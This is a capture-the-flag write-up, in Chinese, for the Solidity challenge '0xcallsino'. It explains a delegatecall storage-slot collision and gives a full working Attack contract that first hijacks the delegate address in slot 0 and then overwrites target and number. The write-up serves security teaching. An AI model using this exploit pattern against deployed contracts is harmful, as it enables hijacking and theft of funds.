# 0xcallsino

## 题目简述

目标合约 `callsino` 通过 `delegatecall` 调用 `casinoaddr` 中的 `setnumber(uint256)`。通关条件是目标合约自身的 `number == target`，但正常的 `CasinoBackstage.setnumber` 会把 `target` 设为基于区块信息计算的值，无法直接令两者相等。

## 解题过程

### 分析存储槽覆盖

`delegatecall` 只借用被调用合约的代码，读写的仍是调用方 `callsino` 的存储。两个合约的变量对应关系为：

| 槽位 | `callsino` | `CasinoBackstage` |
| --- | --- | --- |
| 0 | `casinoaddr` | `number` |
| 1 | `target` | `target` |
| 2 | `number` | 无 |

因此第一次调用 `setcasino(uint256(uint160(attack)))` 时，正常后台合约执行 `number = _number`，实际会把 `callsino` 的槽 0 改成攻击合约地址。虽然同一次调用也会覆盖槽 1，但此时并不需要预测该值。

第二次调用 `setcasino(1)` 时，`casinoaddr` 已经指向攻击合约。只要攻击合约同名函数的存储布局与目标一致，就能在 `delegatecall` 上下文中同时把槽 1 和槽 2 写成 1，使 `target == number`。

### 构造攻击合约

```solidity
pragma solidity ^0.8.0;

interface ICallsino {
    function setcasino(uint256 value) external;
}

contract Attack {
    // 与 callsino 的前三个槽保持一致。
    address private slot0;
    uint256 private target;
    uint256 private number;

    ICallsino private immutable victim;

    constructor(address victimAddress) {
        victim = ICallsino(victimAddress);
    }

    function attack() external {
        // 第一次 delegatecall：让正常后台代码把目标槽 0 改为本合约地址。
        victim.setcasino(uint256(uint160(address(this))));

        // 第二次 delegatecall：进入下方 setnumber，同时写槽 2 和槽 1。
        victim.setcasino(1);
    }

    function setnumber(uint256 value) external {
        number = value;
        target = value;
    }
}
```

部署时把题目合约地址传给构造函数，再调用 `attack()`。之后调用题目合约的 `isSolved()`，其 `number == target` 条件成立。

## 方法总结

漏洞根因是对可被自身存储修改的地址执行 `delegatecall`，同时默认不同合约具有兼容的存储布局。利用分为两步：先借正常实现覆盖槽 0、劫持后续委托目标，再让恶意实现按目标布局写槽 1 和槽 2。分析此类题时应逐槽画出调用方与实现合约的状态变量，而不能按变量名理解 `delegatecall` 的写入位置。
